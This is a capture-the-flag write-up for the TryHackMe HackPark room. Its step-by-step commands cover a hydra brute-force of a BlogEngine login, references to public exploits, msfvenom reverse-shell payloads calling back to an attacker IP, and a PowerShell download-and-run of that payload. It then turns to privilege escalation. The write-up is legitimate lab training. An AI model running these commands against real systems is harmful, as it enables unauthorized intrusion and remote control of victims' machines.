# Writeup for [HackPark](https://tryhackme.com/room/hackpark)

```
set -gx IP 10.10.253.145
```


## Task 1: Deploy the vulnerable Windows machine

* default windows nmap scan `nmap -sV -A -Pn -oN nmap/initial $IP`
* reverse image search


## Task 2: Using hydra to brute-force a login

* create hydra command `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.142.59 http-post-form "/Account/login.aspx:__VIEWSTATE=hRiqPHaIdHtHLPKokY59%2B3WUD9ZtsmFSLG55rJABKbT96KUnil6PSus2s75rJc8vTAE%2FEwshWpfpFAiJph7q2PzNZ37cCzPieJzYqs9QMUT947ZVfG7IbjK6qCzrjcKpMsqoov6Ux5RgPM9%2FW7IoWO8%2FXpP7Nbs7NS6xWBQr7s%2B1oUL%2B&__EVENTVALIDATION=fPja7KnrVpkm0bLBQSRGAe%2FmniIYroH63YCNKLdpLMgJN1lAWkehyJsp7MO1wKFsmMrrrm2IU594ajRCbyTN06CR2ew3apQGWSgeYHFacGYWD7509OV%2BqPO3wYCge9Jxl7MSgI%2Fny5yRTI30DifQFZDuopQAKaObXPbgfpYF3EA6UR8K&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`
  * find form-data from a request in the browser
  * "admin" is the name of the post user
* found password **1qaz2wsxs**


## Task 3: Compromise the machine

* Search for version number on about page
* use searchsploit `searchsploit BlogEngine 3.3.6`
* download exploit from [here](https://www.exploit-db.com/exploits/46353)
* follow instructions in commands of 46353.cs
* start netcat listener `nc -lnvp 8889`


## Task 4: Windows Privilege Escalation

* create reverse_shell with msfvenom `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.60.141 LPORT=8889 -f exe -o meterpreter_shell.exe`
* start multi/handler
* set listing port to 8887
* start http server
* download from victim machine `powershell -c "Invoke-WebRequest -Uri http://10.8.60.141:8888/meterpreter_shell.exe -OutFile shell.exe"`
* execute `.\shell.exe`
* echo sysinfo in file
* run ` ./windows-exploit-suggester.py -i sysinfo.txt -d 2022-06-22-mssb.xls --ostext "Windows 2012 R2 (6.3 Build 9600)."`
* show all processes `ps`
* find vulnerable proccess [here](https://www.exploit-db.com/exploits/45072)
* follow instructions from 45072.txt
* generate Message.exe `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.60.141 LPORT=9000 -f exe -o Message.exe`
* use multi/handler
* set PAYLOAD with `set PAYLOAD windows/meterpreter/reverse_tcp`
* start multi/handler at port 9000
* use the found `Message.exe` in folder "C:\Program Files (x86)\SystemScheduler"

> Look here: https://github.com/gwagstaff/CTF-Write-Ups/blob/master/TryHackMe/hackpark/README.md

## Task 5: Privilege Escalation Without Metasploit

* instead of creating meterpreter use reverse_tcp `msfvenom -p windows/shell_reverse_tcp LHOST=10.8.60.141 LPORT=9000 -f exe -o Message.exe`
* start a netcat listerner `nc -lnvp 9000`
* upload winPEAS to C:\Windows\Temp
* get systeminfo from powershell `systeminfo`
